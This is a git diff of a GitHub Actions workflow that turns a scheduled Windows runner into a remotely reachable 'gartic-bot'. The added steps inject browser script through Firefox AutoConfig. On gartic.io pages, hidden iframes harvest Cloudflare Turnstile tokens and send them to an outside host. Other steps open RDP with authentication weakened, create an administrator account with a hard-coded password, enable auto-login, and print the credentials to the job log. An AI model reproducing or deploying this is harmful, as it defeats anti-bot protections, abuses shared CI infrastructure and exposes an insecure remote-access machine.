@@ -1,59 +1,94 @@
 name: ˢᵃᶤᶠ ₉₁
 
 on:
-  workflow_dispatch:      # عشان تشغله يدوي لو حبيت
+  workflow_dispatch:
   schedule:
-    - cron: '0 */6 * * *' # ده السطر السحري: هيشتغل لوحده كل 6 ساعات
+    - cron: '0 */6 * * *'
 
 jobs:
   gartic-bot:
     runs-on: windows-2019
-    timeout-minutes: 360  # 6 ساعات
+    timeout-minutes: 360
 
     steps:
-      - name: 1. Configure RDP Network
+      - name: 1. Configure RDP & Auto-Login
         run: |
+          # إعدادات الـ RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389
 
-      - name: 2. Configure Extensions (No Install Needed)
+          # إعداد تسجيل الدخول التلقائي (Auto-Login)
+          $password = "admin@123"
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+          Set-ItemProperty -Path $regPath -Name "AutoAdminLogon" -Value "1"
+          Set-ItemProperty -Path $regPath -Name "DefaultUserName" -Value "saif123"
+          Set-ItemProperty -Path $regPath -Name "DefaultPassword" -Value $password
+          Set-ItemProperty -Path $regPath -Name "AutoLogonCount" -Value 5000
+
+      - name: 2. Core Script Injection (The "Secret" Injector)
         run: |
           $firefoxDir = "C:\Program Files\Mozilla Firefox"
-          $distDir = "$firefoxDir\distribution"
-          if (!(Test-Path $distDir)) { New-Item -ItemType Directory -Force -Path $distDir }
+          if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
 
-          $extensions = @(
-              "https://addons.mozilla.org/firefox/downloads/latest/ublock-origin/latest.xpi",
-              "https://addons.mozilla.org/firefox/downloads/latest/auto-refresh-page/latest.xpi",
-              "https://addons.mozilla.org/firefox/downloads/latest/multi-account-containers/latest.xpi",
-              "https://addons.mozilla.org/firefox/downloads/latest/tampermonkey/latest.xpi"
-          )
+          # تفعيل الـ AutoConfig
+          $prefContent = 'pref("general.config.filename", "firefox.cfg");' + "`r`n" + 'pref("general.config.obscure_value", 0);'
+          [System.IO.File]::WriteAllText("$firefoxDir\defaults\pref\autoconfig.js", $prefContent)
 
-          $policies = @{
-              policies = @{
-                  Extensions = @{ Install = $extensions }
-                  DisableAppUpdate = $true
-                  DontCheckDefaultBrowser = $true
-                  Homepage = @{
-                      URL = "https://gartic.io"
-                      StartPage = "homepage"
-                  }
+          # السكربت المحقون (Gartic Token Fetcher)
+          $jsContent = @"
+          var {classes: Cc, interfaces: Ci, utils: Cu} = Components;
+          try {
+            Cu.import("resource://gre/modules/Services.jsm");
+            var observer = {
+              observe: function(subject, topic, data) {
+                if (topic === "content-document-global-created") {
+                  var win = subject;
+                  win.addEventListener("load", function() {
+                    if (win.location.href.indexOf("gartic.io") !== -1) {
+                      var script = win.document.createElement("script");
+                      script.textContent = \`(function() {
+                        setInterval(() => { location.reload(); }, 50000);
+                        function send(t) {
+                          if (t.length > 20) fetch('https://www.xsw.work.gd/add-token', {
+                            method: 'POST', headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({token: t})
+                          }).catch(()=>{});
+                        }
+                        window.addEventListener('message', e => { if(typeof e.data === 'string') send(e.data); });
+                        for (let i=0; i<5; i++) {
+                          const f = document.createElement('iframe');
+                          f.style.display = 'none';
+                          f.srcdoc = '<html><head><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script></head><body><div id="cf-turnstile"></div><script>function req(){try{window.turnstile.render("#cf-turnstile",{sitekey:"0x4AAAAAABBPKaIbNwnPEfSo",callback:t=>parent.postMessage(t,"*")})}catch(e){}}setInterval(req,3500);setTimeout(req,200);</script></body></html>';
+                          document.body.appendChild(f);
+                        }
+                      })();\`;
+                      win.document.body.appendChild(script);
+                    }
+                  });
+                }
               }
-          }
-          $policies | ConvertTo-Json -Depth 4 | Out-File "$distDir\policies.json" -Encoding UTF8
+            };
+            Services.obs.addObserver(observer, "content-document-global-created", false);
+          } catch (e) {}
+          "@
+          [System.IO.File]::WriteAllText("$firefoxDir\firefox.cfg", $jsContent)
 
-      - name: 3. Create RDP User
+      - name: 3. Create User & Startup Shortcut
         run: |
           $password = "admin@123"
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-          
           New-LocalUser -Name "saif123" -Password $securePass -AccountNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "saif123"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "saif123"
-          
-          echo "RDP_USER=YOU" >> $env:GITHUB_ENV
-          echo "RDP_PASS=$password" >> $env:GITHUB_ENV
+
+          # وضع اختصار للمتصفح في مجلد الـ Startup عشان يفتح لوحده أول ما الويندوز يسجل دخول
+          $startupPath = "C:\Users\saif123\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+          if (!(Test-Path $startupPath)) { New-Item -ItemType Directory -Force -Path $startupPath }
+          $shell = New-Object -ComObject WScript.Shell
+          $shortcut = $shell.CreateShortcut("$startupPath\LaunchGartic.lnk")
+          $shortcut.TargetPath = "C:\Program Files\Mozilla Firefox\firefox.exe"
+          $shortcut.Arguments = "https://gartic.io"
+          $shortcut.Save()
 
       - name: 4. Start Tailscale
         run: |
@@ -62,12 +97,9 @@ jobs:
           Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet", "/norestart" -Wait
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gartic-fast
 
-      - name: 5. Launch Firefox
+      - name: 5. Keep Alive
         run: |
           $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          echo "::notice title=RDP CONNECT INFO::IP: $ip | User: saif123 | Pass: admin@123"
-          
-          Start-Process "C:\Program Files\Mozilla Firefox\firefox.exe"
-          
-          Write-Host "RDP Ready! Will restart automatically every 6 hours."
+          echo "::notice title=RDP READY::IP: $ip | User: saif123 | Pass: admin@123"
+          Write-Host "The bot is running in the background. Windows logged in automatically."
           while ($true) { Start-Sleep -Seconds 300 }
